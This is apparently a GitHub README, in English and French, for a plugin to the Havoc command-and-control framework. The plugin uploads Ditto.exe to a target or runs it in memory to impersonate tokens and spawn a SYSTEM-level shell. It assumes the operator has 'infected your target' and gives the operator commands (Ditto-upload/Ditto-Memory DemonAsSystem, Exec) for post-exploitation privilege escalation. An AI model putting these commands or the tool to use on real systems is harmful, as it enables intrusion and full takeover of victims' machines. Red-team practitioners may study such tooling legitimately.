# Havoc_impersonate
## EN
### Description

The Havoc_impersonate module directly integrates impersonation functionality into Havoc.

This script utilizes three binary files. Two of these files are copies of objects from the NoConsoolation module. The third file is Ditto.exe, which performs the impersonation. We thank @LeDocteurDesBits (https://github.com/LeDocteurDesBits/Ditto) for his repository.

This module allows uploading Ditto.exe (or another file) to the target machine or executing the executable directly in memory.

### Installation

1. Install Python dependencies:
```bash
pip install argparse 
```

2. Clone the repository:
```bash
git clone https://github.com/MaldExE/Havoc_impersonnate.git
```

After cloning, open your Havoc client.

3. Click on the "Script" tab and open the script manager window.

4. Click "Load Script", choose the impersonnate.py file, and open it.

A line will appear in the script manager tab, indicating that the script has been loaded into Havoc.

### Usage Guide
#### Prerequisites

You must have infected your target and have a privileged account before using this module.

#### Upload
##### Step 1

This command is used to set the local file to be uploaded to your target. The upload requires your session ID.

```
Ditto-upload SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```

To obtain a system shell:
```
Ditto-upload DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```

To execute a custom command for Ditto:
```
Ditto-upload Exec help
```

#### In Memory
##### Step 1

```
Ditto-Memory SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```

To obtain a system shell:
```
Ditto-Memory DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```

To execute a custom command for Ditto:
```
Ditto-Memory Exec help
```


## FR
### Description

Le module Havoc_impersonnate intègre directement la fonctionnalité d'usurpation d'identité dans Havoc.

Le script utilise trois fichiers binaires. Deux de ces fichiers sont des copies d'objets provenant du module NoConsoolation. Le troisième fichier est Ditto.exe, qui effectue l'usurpation d'identité. Nous remercions @LeDocteurDesBits (https://github.com/LeDocteurDesBits/Ditto) pour son dépôt.

Ce module permet de télécharger Ditto.exe (ou un autre fichier) sur la machine cible ou d'exécuter directement l'exécutable en mémoire.

### Installation

1. Installez les dépendances Python :
```bash
pip install argparse 
```

2. Clonez le dépôt :
```bash
git clone https://github.com/MaldExE/Havoc_impersonnate.git
```

Après le clonage, ouvrez votre client Havoc.

3. Cliquez sur l'onglet "Script" et ouvrez la fenêtre du gestionnaire de scripts.

4. Cliquez sur "Load Script", choisissez le fichier impersonnate.py et ouvrez-le.

Une ligne apparaîtra dans l'onglet du gestionnaire de scripts, indiquant que le script a été chargé dans Havoc.

### Guide d'utilisation
#### Prérequis

Vous devez avoir infecté votre cible et disposer d'un compte privilégié avant d'utiliser ce module.

#### Upload
##### Étape 1

Cette commande est utilisée pour définir le fichier local à télécharger sur votre cible. L'upload nécessite l'ID de votre session.

```
Ditto-upload SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```

Pour obtenir un shell système :
```
Ditto-upload DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```

Pour exécuter une commande personnalisée pour Ditto :
```
Ditto-upload Exec help
```

#### En mémoire
##### Étape 1

```
Ditto-Memory SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
```

Pour obtenir un shell système :
```
Ditto-Memory DemonAsSystem C:\Users\arthur\Desktop\tmp\Hello.exe
```

Pour exécuter une commande personnalisée pour Ditto :
```
Ditto-Memory Exec help
```
